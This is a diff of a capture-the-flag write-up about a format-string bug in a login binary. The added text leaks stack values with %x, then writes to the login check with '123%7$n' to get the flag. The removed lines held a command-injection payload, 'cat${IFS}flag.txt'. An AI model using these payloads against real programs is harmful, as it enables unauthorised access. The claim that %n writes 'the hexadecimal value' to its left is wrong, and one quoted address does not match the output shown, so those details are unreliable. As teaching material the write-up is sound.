@@ -17,17 +17,17 @@ The decompiled code from Ghidra is as follows; I have done some minor changes to
 ```
 int main(void) { 
   char* __ptr = calloc(1, 40);
-  printf("user = %p\n",__ptr);
-  puts("Enter your username:");
+  printf("user = %p\n", __ptr);
+  printf("Enter your username:");
   fgets((__ptr + 4), 20, stdin);
   printf("Enter password for user: ");
   printf((__ptr + 4));
   fgets((__ptr + 24), 20, stdin);
   if (*__ptr == 0) {
-    puts("Invalid login information.");
+    printf("Invalid login information.");
   }
   else {
-    puts("Successfully logged in!");
+    printf("Successfully logged in!");
     giveFlag();
   }
   free(__ptr);
@@ -44,19 +44,47 @@ A prompt for the username is then called, and ```fgets()``` writes the username 
 This means that the first 4 bytes of the buffer are empty (from ```calloc()```), and logging in is not possible unless the first 4 bytes are written to.
 
 ### The exploit 
-A good explanation of the string formatting vulnerability can be found [here](https://www.youtube.com/watch?v=2HxyGWD1htg). Simply put, format specifiers in ```printf()``` can be used to read and write to values off the stack, or elsewhere.
+A good explanation of the string formatting vulnerability can be found [here](https://www.youtube.com/watch?v=2HxyGWD1htg). Simply put, format specifiers in ```printf()``` can be used to read values on the stack, and write to values elsewhere.
 
+I played around with the ```%x``` format specifier, which prints out the values on the stacks, to get things started with. After some experimentation, a few values on the stack were printed out. 
 
+```
+$ python2 -c 'print "%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x"' | ./logmein
+user = 0x11882a0
+Enter your username:
+Enter password for user: 40202f-0-0-11882a4-19-be9a79d0-Invalid login information.
+```
+The value ```0x12fe2a4``` was found on the stack, which meant that memory address of the username (4 bytes off ```user```) was present, but not the actual address of ```user```. The input, capped to a total of 20 characters, was too long to show the other variables on the stack. 
+
+Removing the hyphens (though this makes things less clear), other values further up the stack can be shown:
+```
+$ python2 -c 'print "%x%x%x%x%x%x%x%x%x"' | ./logmein
+user = 0x23272a0
+Enter your username:
+Enter password for user: 40202f0023272a419158a692023272a00a0287083
+Invalid login information.
+```
+
+The address of the user can be found at the seventh 4-byte value on the stack. We confirm this by using ```%7$x``` as an input:
+```
+$ python2 -c 'print "%7$x"' | ./logmein
+user = 0xdb32a0
+Enter your username:
+Enter password for user: db32a0
+Invalid login information.
+```
+
+Now, the only thing left is to write to this value. This can be done by using the ```%n``` specifier. The (hexadecimal) value to the left of the specifier is written to the address specified.
 
 **Solution**
-```
-username at 0x57fde008
-shell at 0x57fde040
-Enter username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat${IFS}flag.txt
-Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat${IFS}flag.txt. Your shell is cat${IFS}flag.txt.
-```
+$ python2 -c 'print "123%7$n"' | ./logmein
+user = 0x15d3010
+Enter your username:
+Enter password for user: 123
+adsf
+Successfully logged in!
 
 **Flag**
 ```
-flag{heap_challenges_are_not_as_scary_as_most_people_think}
+flag{why_does_printf_even_have_%n}
 ```
